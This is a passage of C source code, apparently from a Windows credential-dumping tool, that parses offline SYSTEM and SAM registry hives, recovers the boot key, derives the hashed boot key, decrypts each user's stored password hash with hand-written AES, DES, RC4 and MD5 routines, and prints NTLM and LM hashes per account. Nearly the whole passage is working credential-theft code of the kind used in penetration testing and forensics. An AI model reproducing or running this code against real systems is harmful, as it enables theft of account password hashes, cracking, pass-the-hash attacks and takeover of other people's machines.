        if (b & 1) p ^= a;
        uint8_t hi = a & 0x80;
        a <<= 1;
        if (hi) a ^= 0x1b;
        b >>= 1;
    }
    return p;
}

static void AesInit(void) {
    static int done = 0;
    if (done) return;
    for (int i = 0; i < 256; i++) AES_INV[AES_SBOX[i]] = (uint8_t)i;
    done = 1;
}

static const uint8_t AES_RCON[10] = {0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36};

static void AesExpandKey(const uint8_t *key, uint8_t rk[176]) {
    memcpy(rk, key, 16);
    for (int i = 4; i < 44; i++) {
        uint8_t t[4];
        memcpy(t, rk + (i-1)*4, 4);
        if (i % 4 == 0) {
            uint8_t tmp = t[0];
            t[0] = AES_SBOX[t[1]] ^ AES_RCON[i/4 - 1];
            t[1] = AES_SBOX[t[2]];
            t[2] = AES_SBOX[t[3]];
            t[3] = AES_SBOX[tmp];
        }
        for (int j = 0; j < 4; j++)
            rk[i*4 + j] = rk[(i-4)*4 + j] ^ t[j];
    }
}

/* state layout: s[r + 4*c] mirrors input byte order */
static void AesAddRoundKey(uint8_t s[16], const uint8_t *rk) {
    for (int i = 0; i < 16; i++) s[i] ^= rk[i];
}
static void AesInvShiftRows(uint8_t s[16]) {
    for (int r = 1; r < 4; r++) {
        uint8_t t[4];
        for (int c = 0; c < 4; c++) t[c] = s[r + 4*c];
        for (int c = 0; c < 4; c++) s[r + 4*c] = t[(c + 4 - r) % 4];
    }
}
static void AesInvSubBytes(uint8_t s[16]) {
    AesInit();
    for (int i = 0; i < 16; i++) s[i] = AES_INV[s[i]];
}
static void AesInvMixColumns(uint8_t s[16]) {
    for (int c = 0; c < 4; c++) {
        uint8_t *col = s + 4*c;
        uint8_t a0 = col[0], a1 = col[1], a2 = col[2], a3 = col[3];
        col[0] = (uint8_t)(AesGmul(a0,14) ^ AesGmul(a1,11) ^ AesGmul(a2,13) ^ AesGmul(a3, 9));
        col[1] = (uint8_t)(AesGmul(a0, 9) ^ AesGmul(a1,14) ^ AesGmul(a2,11) ^ AesGmul(a3,13));
        col[2] = (uint8_t)(AesGmul(a0,13) ^ AesGmul(a1, 9) ^ AesGmul(a2,14) ^ AesGmul(a3,11));
        col[3] = (uint8_t)(AesGmul(a0,11) ^ AesGmul(a1,13) ^ AesGmul(a2, 9) ^ AesGmul(a3,14));
    }
}
static void AesDecryptBlock(const uint8_t rk[176], const uint8_t *in, uint8_t *out) {
    uint8_t s[16];
    memcpy(s, in, 16);
    AesAddRoundKey(s, rk + 160);
    for (int round = 9; round >= 1; round--) {
        AesInvShiftRows(s);
        AesInvSubBytes(s);
        AesAddRoundKey(s, rk + round*16);
        AesInvMixColumns(s);
    }
    AesInvShiftRows(s);
    AesInvSubBytes(s);
    AesAddRoundKey(s, rk);
    memcpy(out, s, 16);
}
static void Aes128CbcDecrypt(const uint8_t key[16], const uint8_t iv[16],
                             const uint8_t *ct, DWORD len, uint8_t *pt) {
    uint8_t rk[176];
    AesExpandKey(key, rk);
    uint8_t prev[16];
    memcpy(prev, iv, 16);
    for (DWORD off = 0; off + 16 <= len; off += 16) {
        uint8_t dec[16];
        AesDecryptBlock(rk, ct + off, dec);
        for (int i = 0; i < 16; i++) pt[off + i] = dec[i] ^ prev[i];
        memcpy(prev, ct + off, 16);
    }
}

/* ==================== BOOT KEY & SAM ==================== */
static BOOL ExtractBootKey(HIVE *systemHive, BYTE *bootKey) {
    int32_t lsa = HiveFindKey(systemHive, -1, L"ControlSet001\\Control\\Lsa");
    if (lsa < 0) lsa = HiveFindKey(systemHive, -1, L"CurrentControlSet\\Control\\Lsa");
    if (lsa < 0) { wprintf(L"[!] SYSTEM hive: Control\\Lsa not found\n"); return FALSE; }

    const wchar_t *names[] = {L"JD", L"Skew1", L"GBG", L"Data"};
    char hexStr[64] = {0};
    int hpos = 0;

    for (int k = 0; k < 4; k++) {
        int32_t keyOff = HiveFindSubkeyInParent(systemHive, lsa, names[k]);
        if (keyOff < 0) { wprintf(L"[!] boot key: %ls not found\n", names[k]); return FALSE; }
        BYTE *nk = CELL_PTR(systemHive, keyOff);
        uint32_t classOff = *(uint32_t*)(nk + 0x30);
        uint16_t classLen = *(uint16_t*)(nk + 0x4A);
        if (classLen == 0) { wprintf(L"[!] boot key: %ls class empty\n", names[k]); return FALSE; }
        BYTE *cls = CELL_PTR(systemHive, classOff);
        if (!HiveIn(systemHive, cls, classLen)) {
            wprintf(L"[!] boot key: %ls class OOB off=%u len=%u\n", names[k], classOff, classLen);
            return FALSE;
        }
        for (int i = 0; i < classLen; i++) {
            char ch = (char)cls[i];
            if (ch >= '0' && ch <= '9') hexStr[hpos++] = ch;
            else if (ch >= 'a' && ch <= 'f') hexStr[hpos++] = ch;
            else if (ch >= 'A' && ch <= 'F') hexStr[hpos++] = ch;
        }
    }
    if (hpos != 32) { wprintf(L"[!] boot key: got %d hex chars, need 32\n", hpos); return FALSE; }

    BYTE scrambled[16];
    for (int i = 0; i < 16; i++) {
        char b[3] = {hexStr[i*2], hexStr[i*2+1], 0};
        scrambled[i] = (BYTE)strtol(b, NULL, 16);
    }

    int p[] = {0x08,0x05,0x04,0x02,0x0B,0x09,0x0D,0x03,
               0x00,0x06,0x01,0x0C,0x0E,0x0A,0x0F,0x07};
    for (int i = 0; i < 16; i++) bootKey[i] = scrambled[p[i]];
    return TRUE;
}

/* ==================== DES (single, ECB) ==================== */
/* Needed for the final SAM hash step: RC4 output is two 8-byte halves,
   each DES-decrypted with a RID-derived key. Standard FIPS 46-3 tables. */
static const uint8_t DES_IP[64] = {
    58,50,42,34,26,18,10, 2,60,52,44,36,28,20,12, 4,
    62,54,46,38,30,22,14, 6,64,56,48,40,32,24,16, 8,
    57,49,41,33,25,17, 9, 1,59,51,43,35,27,19,11, 3,
    61,53,45,37,29,21,13, 5,63,55,47,39,31,23,15, 7 };
static const uint8_t DES_FP[64] = {
    40, 8,48,16,56,24,64,32,39, 7,47,15,55,23,63,31,
    38, 6,46,14,54,22,62,30,37, 5,45,13,53,21,61,29,
    36, 4,44,12,52,20,60,28,35, 3,43,11,51,19,59,27,
    34, 2,42,10,50,18,58,26,33, 1,41, 9,49,17,57,25 };
static const uint8_t DES_E[48] = {
    32, 1, 2, 3, 4, 5,  4, 5, 6, 7, 8, 9,
     8, 9,10,11,12,13, 12,13,14,15,16,17,
    16,17,18,19,20,21, 20,21,22,23,24,25,
    24,25,26,27,28,29, 28,29,30,31,32, 1 };
static const uint8_t DES_P[32] = {
    16, 7,20,21,29,12,28,17, 1,15,23,26, 5,18,31,10,
     2, 8,24,14,32,27, 3, 9,19,13,30, 6,22,11, 4,25 };
static const uint8_t DES_PC1[56] = {
    57,49,41,33,25,17, 9, 1,58,50,42,34,26,18,
    10, 2,59,51,43,35,27,19,11, 3,60,52,44,36,
    63,55,47,39,31,23,15, 7,62,54,46,38,30,22,
    14, 6,61,53,45,37,29,21,13, 5,28,20,12, 4 };
static const uint8_t DES_PC2[48] = {
    14,17,11,24, 1, 5, 3,28,15, 6,21,10,
    23,19,12, 4,26, 8,16, 7,27,20,13, 2,
    41,52,31,37,47,55,30,40,51,45,33,48,
    44,49,39,56,34,53,46,42,50,36,29,32 };
static const uint8_t DES_SHIFTS[16] = {1,2,4,6,8,10,12,14,15,17,19,21,23,25,27,28};
static const uint8_t DES_SBOX[8][64] = {
    {14, 4,13, 1, 2,15,11, 8, 3,10, 6,12, 5, 9, 0, 7,
      0,15, 7, 4,14, 2,13, 1,10, 6,12,11, 9, 5, 3, 8,
      4, 1,14, 8,13, 6, 2,11,15,12, 9, 7, 3,10, 5, 0,
     15,12, 8, 2, 4, 9, 1, 7, 5,11, 3,14,10, 0, 6,13},
    {15, 1, 8,14, 6,11, 3, 4, 9, 7, 2,13,12, 0, 5,10,
      3,13, 4, 7,15, 2, 8,14,12, 0, 1,10, 6, 9,11, 5,
      0,14, 7,11,10, 4,13, 1, 5, 8,12, 6, 9, 3, 2,15,
     13, 8,10, 1, 3,15, 4, 2,11, 6, 7,12, 0, 5,14, 9},
    {10, 0, 9,14, 6, 3,15, 5, 1,13,12, 7,11, 4, 2, 8,
     13, 7, 0, 9, 3, 4, 6,10, 2, 8, 5,14,12,11,15, 1,
     13, 6, 4, 9, 8,15, 3, 0,11, 1, 2,12, 5,10,14, 7,
      1,10,13, 0, 6, 9, 8, 7, 4,15,14, 3,11, 5, 2,12},
    { 7,13,14, 3, 0, 6, 9,10, 1, 2, 8, 5,11,12, 4,15,
     13, 8,11, 5, 6,15, 0, 3, 4, 7, 2,12, 1,10,14, 9,
     10, 6, 9, 0,12,11, 7,13,15, 1, 3,14, 5, 2, 8, 4,
      3,15, 0, 6,10, 1,13, 8, 9, 4, 5,11,12, 7, 2,14},
    { 2,12, 4, 1, 7,10,11, 6, 8, 5, 3,15,13, 0,14, 9,
     14,11, 2,12, 4, 7,13, 1, 5, 0,15,10, 3, 9, 8, 6,
      4, 2, 1,11,10,13, 7, 8,15, 9,12, 5, 6, 3, 0,14,
     11, 8,12, 7, 1,14, 2,13, 6,15, 0, 9,10, 4, 5, 3},
    {12, 1,10,15, 9, 2, 6, 8, 0,13, 3, 4,14, 7, 5,11,
     10,15, 4, 2, 7,12, 9, 5, 6, 1,13,14, 0,11, 3, 8,
      9,14,15, 5, 2, 8,12, 3, 7, 0, 4,10, 1,13,11, 6,
      4, 3, 2,12, 9, 5,15,10,11,14, 1, 7, 6, 0, 8,13},
    { 4,11, 2,14,15, 0, 8,13, 3,12, 9, 7, 5,10, 6, 1,
     13, 0,11, 7, 4, 9, 1,10,14, 3, 5,12, 2,15, 8, 6,
      1, 4,11,13,12, 3, 7,14,10,15, 6, 8, 0, 5, 9, 2,
      6,11,13, 8, 1, 4,10, 7, 9, 5, 0,15,14, 2, 3,12},
    {13, 2, 8, 4, 6,15,11, 1,10, 9, 3,14, 5, 0,12, 7,
      1,15,13, 8,10, 3, 7, 4,12, 5, 6,11, 0,14, 9, 2,
      7,11, 4, 1, 9,12,14, 2, 0, 6,10,13,15, 3, 5, 8,
      2, 1,14, 7, 4,10, 8,13,15,12, 9, 0, 3, 5, 6,11} };

static uint64_t DesBitsel(const uint8_t *tbl, int n, uint64_t v, int inBits) {
    uint64_t r = 0;
    for (int i = 0; i < n; i++) {
        int pos = tbl[i];   /* 1-based, MSB of input = bit 1 */
        r = (r << 1) | ((v >> (inBits - pos)) & 1ULL);
    }
    return r;
}

static uint32_t DesF(uint32_t R, uint64_t k48) {
    uint64_t e = DesBitsel(DES_E, 48, R, 32) ^ k48;
    uint32_t s = 0;
    for (int i = 0; i < 8; i++) {
        int six = (int)((e >> (42 - 6*i)) & 0x3F);
        int row = ((six >> 4) & 2) | (six & 1);
        int col = (six >> 1) & 0x0F;
        s = (s << 4) | (uint32_t)DES_SBOX[i][row*16 + col];
    }
    return (uint32_t)DesBitsel(DES_P, 32, s, 32);
}

static void DesDecrypt(const uint8_t key[8], uint8_t block[8]) {
    uint64_t k = 0;
    for (int i = 0; i < 8; i++) k = (k << 8) | key[i];
    uint64_t cd = DesBitsel(DES_PC1, 56, k, 64);
    uint32_t C0 = (uint32_t)(cd >> 28), D0 = (uint32_t)(cd & 0x0FFFFFFF);
    uint64_t sk[16];
    for (int r = 0; r < 16; r++) {
        uint32_t C = ((C0 << DES_SHIFTS[r]) | (C0 >> (28 - DES_SHIFTS[r]))) & 0x0FFFFFFF;
        uint32_t D = ((D0 << DES_SHIFTS[r]) | (D0 >> (28 - DES_SHIFTS[r]))) & 0x0FFFFFFF;
        sk[r] = DesBitsel(DES_PC2, 48, ((uint64_t)C << 28) | D, 56);
    }
    uint64_t b = 0;
    for (int i = 0; i < 8; i++) b = (b << 8) | block[i];
    uint64_t ip = DesBitsel(DES_IP, 64, b, 64);
    uint32_t L = (uint32_t)(ip >> 32), R = (uint32_t)ip;
    for (int r = 15; r >= 0; r--) {          /* decrypt = reverse subkeys */
        uint32_t T = R;
        R = L ^ DesF(R, sk[r]);
        L = T;
    }
    uint64_t out = DesBitsel(DES_FP, 64, ((uint64_t)R << 32) | L, 64);
    for (int i = 0; i < 8; i++) block[i] = (uint8_t)(out >> (56 - 8*i));
}

/* 7 bytes -> DES key with parity bits */
static void StrToKey(const uint8_t s[7], uint8_t key[8]) {
    key[0] = s[0] >> 1;
    key[1] = ((s[0] & 0x01) << 6) | (s[1] >> 2);
    key[2] = ((s[1] & 0x03) << 5) | (s[2] >> 3);
    key[3] = ((s[2] & 0x07) << 4) | (s[3] >> 4);
    key[4] = ((s[3] & 0x0F) << 3) | (s[4] >> 5);
    key[5] = ((s[4] & 0x1F) << 2) | (s[5] >> 6);
    key[6] = ((s[5] & 0x3F) << 1) | (s[6] >> 7);
    key[7] = s[6] & 0x7F;
    for (int i = 0; i < 8; i++) key[i] = (uint8_t)((key[i] << 1) & 0xFE);
}

static void SidToKey(uint32_t rid, uint8_t k1[8], uint8_t k2[8]) {
    uint8_t r0 = (uint8_t)(rid & 0xFF), r1 = (uint8_t)((rid >> 8) & 0xFF);
    uint8_t r2 = (uint8_t)((rid >> 16) & 0xFF), r3 = (uint8_t)((rid >> 24) & 0xFF);
    /* MS-RSFS 2.2.11.1.3: no zero padding — bytes repeat */
    uint8_t s1[7] = { r0, r1, r2, r3, r0, r1, r2 };
    uint8_t s2[7] = { r3, r0, r1, r2, r3, r0, r1 };
    StrToKey(s1, k1);
    StrToKey(s2, k2);
}

/* DES-ECB the two 8-byte halves with RID-derived keys (final shared step) */
static void DesHalves(uint32_t rid, const BYTE *key16, BYTE *out) {
    uint8_t k1[8], k2[8];
    SidToKey(rid, k1, k2);
    memcpy(out, key16, 16);
    DesDecrypt(k1, out);
    DesDecrypt(k2, out + 8);
}

/* old-style (syskey rev1): RC4(MD5(hbk||rid||salt)) then DES halves */
static void DecryptHashOld(BYTE *hbk, uint32_t rid, BYTE *enc, BYTE *out, const char *salt, int saltLen) {
    BYTE md5in[32];
    memcpy(md5in, hbk, 16);
    memcpy(md5in+16, &rid, 4);
    memcpy(md5in+20, salt, saltLen);
    BYTE rc4key[16];
    MD5(md5in, 20 + saltLen, rc4key);
    memcpy(out, enc, 16);
    RC4(rc4key, 16, out, 16);
    DesHalves(rid, out, out);
}

/* hashed boot key from SAM\Domains\Account 'F' (impacket semantics):
   Key0[0]==1 → RC4(MD5(Salt||QWERTY||bootkey||DIGITS)) over Key||CheckSum
   Key0[0]==2 → AES-128-CBC(bootkey, Salt, Data[:DataLen])  (Win10 1607+) */
static BOOL GetHBootKey(HIVE *samHive, BYTE *bootKey, BYTE *hbk) {
    int32_t acct = HiveFindKey(samHive, -1, L"SAM\\Domains\\Account");
    if (acct < 0) { wprintf(L"[!] SAM\\Domains\\Account not found\n"); return FALSE; }
    BYTE *fData = NULL; DWORD fSize = 0;
    if (!HiveGetValue(samHive, acct, L"F", &fData, &fSize) || fSize < 0x68 + 32) {
        wprintf(L"[!] Account 'F' missing/short (%u)\n", fSize);
        free(fData); return FALSE;
    }
    BYTE *k0 = fData + 0x68;
    wprintf(L"[*] F: len=%u key0 style=%u\n", fSize, k0[0]);
    if (k0[0] == 2) {
        DWORD dataLen = *(uint32_t *)(k0 + 12);
        if (dataLen < 16 || dataLen > 64) {
            wprintf(L"[!] F: bad DataLen %u\n", dataLen);
            free(fData); return FALSE;
        }
        uint8_t out[64];
        Aes128CbcDecrypt(bootKey, k0 + 16, k0 + 32, dataLen, out);
        memcpy(hbk, out, 16);
        wprintf(L"[*] hbootkey (AES): ");
        for (int i = 0; i < 16; i++) wprintf(L"%02X", hbk[i]);
        wprintf(L"\n");
        free(fData);
        return TRUE;
    } else if (k0[0] == 1) {
        /* lengths must match impacket's constants exactly (47 / 41 bytes) */
        static const char QWERTY[] = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%";
        static const char DIGITS[] = "0123456789012345678901234567890123456789";
        BYTE md5in[16 + 47 + 16 + 41];
        DWORD o = 0;
        memcpy(md5in + o, k0 + 8, 16); o += 16;   /* Salt */
        memcpy(md5in + o, QWERTY, sizeof(QWERTY)); o += (DWORD)sizeof(QWERTY);
        memcpy(md5in + o, bootKey, 16); o += 16;
        memcpy(md5in + o, DIGITS, sizeof(DIGITS)); o += (DWORD)sizeof(DIGITS);
        BYTE rc4key[16];
        MD5(md5in, o, rc4key);
        uint8_t dec[32];
        memcpy(dec, k0 + 24, 32);                  /* Key || CheckSum */
        RC4(rc4key, 16, dec, 32);
        memcpy(hbk, dec, 16);
        wprintf(L"[*] hbootkey (RC4): ");
        for (int i = 0; i < 16; i++) wprintf(L"%02X", hbk[i]);
        wprintf(L"\n");
        free(fData);
        return TRUE;
    }
    wprintf(L"[!] unknown F key style %u\n", k0[0]);
    free(fData);
    return FALSE;
}

/* per-user hash blob dispatch:
   old style (blob[2]==1, 20B): {PekID(2), Rev(2), Hash(16)} → RC4+DES
   new style (24B+): {PekID(2), Rev(2), DataOffset(4), Salt(16), Data} → AES+DES */
static void DecryptBlob(BYTE *hbk, uint32_t rid, BYTE *blob, DWORD blobLen,
                        BYTE *out, const char *salt, int *has) {
    if (blobLen == 20 && blob[2] == 1) {
        DecryptHashOld(hbk, rid, blob + 4, out, salt, 11);
        *has = 1;
        return;
    }
    if (blobLen > 24 && blob[2] != 1) {
        DWORD dl = blobLen - 24;
        if (dl > 64) dl = 64;
        uint8_t tmp[64];
        Aes128CbcDecrypt(hbk, blob + 8, blob + 24, dl, tmp);
        if (dl >= 16) {
            DesHalves(rid, tmp, out);
            *has = 1;
        }
    }
}

typedef struct {
    uint32_t rid;
    wchar_t username[64];
    BYTE lmHash[16];
    BYTE ntHash[16];
    int hasLm;
    int hasNt;
} SAM_USER;

/* empty-password placeholders (impacket: NTOWFv1('') / LMOWFv1('')) */
static const BYTE EMPTY_NT[16] = {0x31,0xD6,0xCF,0xE0,0xD1,0x6A,0xE9,0x31,
                                  0xB7,0x3C,0x59,0xD7,0xE0,0xC0,0x89,0xC0};
static const BYTE EMPTY_LM[16] = {0xAA,0xD3,0xB4,0x35,0xB5,0x14,0x04,0xEE,
                                  0xAA,0xD3,0xB4,0x35,0xB5,0x14,0x04,0xEE};

typedef struct {
    SAM_USER *users;
    int count;
    int cap;
    HIVE *sam;
    HIVE *sys;
    BYTE hbk[16];
} ENUM_CTX;

static void SamEnumCb(int32_t nkOff, void *vctx) {
    ENUM_CTX *ctx = vctx;
    if (nkOff < 0) return;
    BYTE *nk = CELL_PTR(ctx->sam, nkOff);
    if (!HiveIn(ctx->sam, nk, 0x50)) return;
    if (*(uint16_t*)nk != 0x6B6E) return;
    uint16_t nlen = *(uint16_t*)(nk + 0x48);
    uint16_t nflags = *(uint16_t*)(nk + 2);

    /* Users subkeys are 8-char hex RID names (+ "Names" which has no 'V') */
    char ridStr[16] = {0};
    if (nflags & 0x0020) {
        if (nlen != 8) return;
        char *nm = (char*)(nk + 0x4C);
        for (int i = 0; i < 8; i++) ridStr[i] = nm[i];
    } else {
        if (nlen != 16) return;
        wchar_t *nm = (wchar_t*)(nk + 0x4C);
        for (int i = 0; i < 8; i++) ridStr[i] = (char)nm[i];
    }
    uint32_t rid = (uint32_t)strtoul(ridStr, NULL, 16);

    BYTE *vData = NULL; DWORD vSize = 0;
    if (!HiveGetValue(ctx->sam, nkOff, L"V", &vData, &vSize)) return;
    if (vSize < 0xCC) { free(vData); return; }

    /* V layout (offsets relative to 0xCC, verified on-disk):
       0x0C/0x10 username off/len, 0x9C/0xA0 LM off/len, 0xA8/0xAC NT off/len */
    uint32_t nameOff  = *(uint32_t*)(vData + 0x0C);
    uint32_t nameSize = *(uint32_t*)(vData + 0x10);
    uint32_t lmOff    = *(uint32_t*)(vData + 0x9C);
    uint32_t lmSize   = *(uint32_t*)(vData + 0xA0);
    uint32_t ntOff    = *(uint32_t*)(vData + 0xA8);
    uint32_t ntSize   = *(uint32_t*)(vData + 0xAC);

    /* offsets are relative to 0xCC: reject anything outside the blob */
    if (0xCCull + nameOff + nameSize > vSize) { nameOff = 0; nameSize = 0; }
    if (0xCCull + lmOff   + lmSize   > vSize) { lmOff = 0; lmSize = 0; }
    if (0xCCull + ntOff   + ntSize   > vSize) { ntOff = 0; ntSize = 0; }

    if (ctx->count >= ctx->cap) {
        ctx->cap *= 2;
        ctx->users = realloc(ctx->users, ctx->cap * sizeof(SAM_USER));
    }
    SAM_USER *u = &ctx->users[ctx->count];
    memset(u, 0, sizeof(SAM_USER));
    u->rid = rid;
    memcpy(u->ntHash, EMPTY_NT, 16);
    memcpy(u->lmHash, EMPTY_LM, 16);

    if (nameSize > 0 && nameSize < 128) {
        wchar_t *un = (wchar_t*)(vData + 0xCC + nameOff);
        int ulen = nameSize / 2;
        if (ulen > 63) ulen = 63;
        for (int i = 0; i < ulen; i++) u->username[i] = un[i];
    }

    if (lmSize >= 20 && (0xCCull + lmOff + lmSize) <= vSize)
        DecryptBlob(ctx->hbk, rid, vData + 0xCC + lmOff, lmSize,
                    u->lmHash, "LMPASSWORD\0", &u->hasLm);
    if (ntSize >= 20 && (0xCCull + ntOff + ntSize) <= vSize)
        DecryptBlob(ctx->hbk, rid, vData + 0xCC + ntOff, ntSize,
                    u->ntHash, "NTPASSWORD\0", &u->hasNt);

    ctx->count++;
    free(vData);
}

static BOOL ExtractSamUsers(HIVE *samHive, HIVE *systemHive) {
    BYTE bootKey[16];
    if (!ExtractBootKey(systemHive, bootKey)) return FALSE;
    wprintf(L"[*] boot key: ");
    for (int i = 0; i < 16; i++) wprintf(L"%02X", bootKey[i]);
    wprintf(L"\n");

    /* crypto self-tests: MD5("abc"), DES weak-key vector, FIPS-197 AES-128 */
    {
        BYTE d[16];
        MD5((const BYTE*)"abc", 3, d);
        wprintf(L"[*] md5 selftest: ");
        for (int i = 0; i < 16; i++) wprintf(L"%02X", d[i]);
        wprintf(L" (want 900150983CD24FB0D6963F7D28E17F72)\n");
        BYTE blk[8] = {0x80,0,0,0,0,0,0,0};
        BYTE kk[8]  = {1,1,1,1,1,1,1,1};
        DesDecrypt(kk, blk);
        wprintf(L"[*] des selftest: ");
        for (int i = 0; i < 8; i++) wprintf(L"%02X", blk[i]);
        wprintf(L" (want 95F8A5E5DD31D900)\n");
        uint8_t ak[16], aiv[16] = {0}, act[16], apt[16];
        const uint8_t act_want[16] = {0x69,0xC4,0xE0,0xD8,0x6A,0x7B,0x04,0x30,
                                      0xD8,0xCD,0xB7,0x80,0x70,0xB4,0xC5,0x5A};
        for (int i = 0; i < 16; i++) ak[i] = (uint8_t)i;
        memcpy(act, act_want, 16);
        Aes128CbcDecrypt(ak, aiv, act, 16, apt);
        wprintf(L"[*] aes selftest: ");
        for (int i = 0; i < 16; i++) wprintf(L"%02X", apt[i]);
        wprintf(L" (want 00112233445566778899AABBCCDDEEFF)\n");
    }

    BYTE hbk[16];
    if (!GetHBootKey(samHive, bootKey, hbk)) return FALSE;

    int32_t usersKey = HiveFindKey(samHive, -1, L"SAM\\Domains\\Account\\Users");
    if (usersKey < 0) { wprintf(L"[!] SAM\\Domains\\Account\\Users not found\n"); return FALSE; }

    BYTE *nk = CELL_PTR(samHive, usersKey);
    if (!HiveIn(samHive, nk, 0x20)) return FALSE;
    uint32_t numSub = *(uint32_t*)(nk + 0x14);
    if (numSub == 0) return FALSE;
    uint32_t listOff = *(uint32_t*)(nk + 0x1C);

    ENUM_CTX ctx = {0};
    ctx.cap = 16;
    ctx.users = malloc(ctx.cap * sizeof(SAM_USER));
    ctx.sam = samHive;
    ctx.sys = systemHive;
    memcpy(ctx.hbk, hbk, 16);

    HiveEnumSubkeys(samHive, listOff, SamEnumCb, &ctx);

    wprintf(L"\n[+] SAM: %d user(s) found\n", ctx.count);
    for (int i = 0; i < ctx.count; i++) {
        SAM_USER *u = &ctx.users[i];
        wprintf(L"\n  RID: 0x%08X | User: %ls\n", u->rid, u->username);
        wprintf(L"    NTLM: ");
        for (int j = 0; j < 16; j++) wprintf(L"%02X", u->ntHash[j]);
        wprintf(L"\n");
        wprintf(L"    LM:   ");
        for (int j = 0; j < 16; j++) wprintf(L"%02X", u->lmHash[j]);
        wprintf(L"\n");
    }

    free(ctx.users);
    return TRUE;
}

/* ==================== CRYPTO ==================== */
static void RC4(const BYTE *key, size_t klen, BYTE *data, size_t dlen) {
    BYTE S[256];
    for (int i = 0; i < 256; i++) S[i] = (BYTE)i;
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % klen]) & 0xFF;
        BYTE t = S[i]; S[i] = S[j]; S[j] = t;
    }
    int x = 0; j = 0;
    for (size_t i = 0; i < dlen; i++) {
        x = (x + 1) & 0xFF;
        j = (j + S[x]) & 0xFF;
        BYTE t = S[x]; S[x] = S[j]; S[j] = t;
        data[i] ^= S[(S[x] + S[j]) & 0xFF];
    }
}

/* MD5 implementation (RFC 1321) */
typedef struct { uint32_t state[4]; uint32_t count[2]; BYTE buffer[64]; } MD5_CTX;
static void MD5Transform(uint32_t state[4], const BYTE block[64]);
static void MD5Init(MD5_CTX *ctx) {
    ctx->count[0] = ctx->count[1] = 0;
    ctx->state[0] = 0x67452301;
    ctx->state[1] = 0xEFCDAB89;
    ctx->state[2] = 0x98BADCFE;
    ctx->state[3] = 0x10325476;
}
static void MD5Update(MD5_CTX *ctx, const BYTE *input, size_t len) {
    size_t i, index, partLen;
    index = (size_t)((ctx->count[0] >> 3) & 0x3F);
    if ((ctx->count[0] += (uint32_t)(len << 3)) < (len << 3)) ctx->count[1]++;
    ctx->count[1] += (uint32_t)(len >> 29);
    partLen = 64 - index;
    if (len >= partLen) {
        memcpy(&ctx->buffer[index], input, partLen);
        MD5Transform(ctx->state, ctx->buffer);
        for (i = partLen; i + 63 < len; i += 64) MD5Transform(ctx->state, &input[i]);
        index = 0;
    } else i = 0;
    memcpy(&ctx->buffer[index], &input[i], len - i);
}
static void MD5Final(BYTE digest[16], MD5_CTX *ctx) {
    BYTE bits[8], padding[64];
    size_t index, padLen;
    memcpy(bits, ctx->count, 8);
    index = (size_t)((ctx->count[0] >> 3) & 0x3F);
    padLen = (index < 56) ? (56 - index) : (120 - index);
    memset(padding, 0, 64); padding[0] = 0x80;
    MD5Update(ctx, padding, padLen);
    MD5Update(ctx, bits, 8);
    memcpy(digest, ctx->state, 16);
}
#define F(x,y,z) (((x) & (y)) | ((~x) & (z)))
#define G(x,y,z) (((x) & (z)) | ((y) & (~z)))
#define H(x,y,z) ((x) ^ (y) ^ (z))
#define I(x,y,z) ((y) ^ ((x) | (~z)))
#define ROTATE_LEFT(x,n) (((x) << (n)) | ((x) >> (32-(n))))
#define FF(a,b,c,d,x,s,ac) { (a) += F((b),(c),(d)) + (x) + (uint32_t)(ac); (a) = ROTATE_LEFT((a),(s)); (a) += (b); }
#define GG(a,b,c,d,x,s,ac) { (a) += G((b),(c),(d)) + (x) + (uint32_t)(ac); (a) = ROTATE_LEFT((a),(s)); (a) += (b); }
#define HH(a,b,c,d,x,s,ac) { (a) += H((b),(c),(d)) + (x) + (uint32_t)(ac); (a) = ROTATE_LEFT((a),(s)); (a) += (b); }
#define II(a,b,c,d,x,s,ac) { (a) += I((b),(c),(d)) + (x) + (uint32_t)(ac); (a) = ROTATE_LEFT((a),(s)); (a) += (b); }
static void MD5Transform(uint32_t state[4], const BYTE block[64]) {
    uint32_t a=state[0],b=state[1],c=state[2],d=state[3],x[16];
    for(int i=0,j=0;j<64;i++,j+=4) x[i]=((uint32_t)block[j]) | (((uint32_t)block[j+1])<<8) | (((uint32_t)block[j+2])<<16) | (((uint32_t)block[j+3])<<24);
    FF(a,b,c,d,x[ 0], 7,0xd76aa478); FF(d,a,b,c,x[ 1],12,0xe8c7b756); FF(c,d,a,b,x[ 2],17,0x242070db); FF(b,c,d,a,x[ 3],22,0xc1bdceee);
    FF(a,b,c,d,x[ 4], 7,0xf57c0faf); FF(d,a,b,c,x[ 5],12,0x4787c62a); FF(c,d,a,b,x[ 6],17,0xa8304613); FF(b,c,d,a,x[ 7],22,0xfd469501);
    FF(a,b,c,d,x[ 8], 7,0x698098d8); FF(d,a,b,c,x[ 9],12,0x8b44f7af); FF(c,d,a,b,x[10],17,0xffff5bb1); FF(b,c,d,a,x[11],22,0x895cd7be);
    FF(a,b,c,d,x[12], 7,0x6b901122); FF(d,a,b,c,x[13],12,0xfd987193); FF(c,d,a,b,x[14],17,0xa679438e); FF(b,c,d,a,x[15],22,0x49b40821);
    GG(a,b,c,d,x[ 1], 5,0xf61e2562); GG(d,a,b,c,x[ 6], 9,0xc040b340); GG(c,d,a,b,x[11],14,0x265e5a51); GG(b,c,d,a,x[ 0],20,0xe9b6c7aa);
    GG(a,b,c,d,x[ 5], 5,0xd62f105d); GG(d,a,b,c,x[10], 9,0x02441453); GG(c,d,a,b,x[15],14,0xd8a1e681); GG(b,c,d,a,x[ 4],20,0xe7d3fbc8);
    GG(a,b,c,d,x[ 9], 5,0x21e1cde6); GG(d,a,b,c,x[14], 9,0xc33707d6); GG(c,d,a,b,x[ 3],14,0xf4d50d87); GG(b,c,d,a,x[ 8],20,0x455a14ed);
    GG(a,b,c,d,x[13], 5,0xa9e3e905); GG(d,a,b,c,x[ 2], 9,0xfcefa3f8); GG(c,d,a,b,x[ 7],14,0x676f02d9); GG(b,c,d,a,x[12],20,0x8d2a4c8a);
    HH(a,b,c,d,x[ 5], 4,0xfffa3942); HH(d,a,b,c,x[ 8],11,0x8771f681); HH(c,d,a,b,x[11],16,0x6d9d6122); HH(b,c,d,a,x[14],23,0xfde5380c);
    HH(a,b,c,d,x[ 1], 4,0xa4beea44); HH(d,a,b,c,x[ 4],11,0x4bdecfa9); HH(c,d,a,b,x[ 7],16,0xf6bb4b60); HH(b,c,d,a,x[10],23,0xbebfbc70);
